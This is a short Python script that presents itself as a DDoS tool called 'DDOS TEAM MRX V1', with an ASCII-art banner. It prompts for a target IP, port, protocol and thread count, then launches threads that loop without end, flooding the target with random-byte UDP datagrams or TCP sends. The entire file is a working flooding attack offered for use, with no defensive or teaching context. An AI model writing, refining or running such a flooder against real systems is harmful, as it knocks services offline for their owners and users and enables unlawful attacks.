#!/usr/bin/env python3

import random
import socket
import threading
import os
import sys

print('''
\033[35m
 ⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄  ⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
             zinou
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁
 
           § DDOS\033[35m TEAM\033[35m MRX\033[35m V1\033[35m §
                                               \033[35m UDP/TCP\033[35m
         ''')


print("\033[35m dev :\033[35m  zinou \033[35m  ")
print("password : TEAM MRX")

ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(Y/N):"))
times = int(input(" PACKETS PER ONE CONNECTION:"))
threads = int(input(" THREADS:"))
def run():
    data = random._urandom((1024))
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" TEAM MRX IN ATTACK BYBI!!!")
        except:
            print("[!] ERROR!!!")

def run2():
    data = random._urandom((1025))
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" server MRX PING YNIK!!!")
        except:
            s.close()
            print("[*] SERVER DAWN")

def run3():
    data = random._urandom((2025))
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"TEAM MRX DDOS ATTACK!!!")
        except:
            s.close()
            print("[*] SERVER DAWN")

for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()

for Y in range(threads):
    if choice == 'Y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run3)
        th.start()
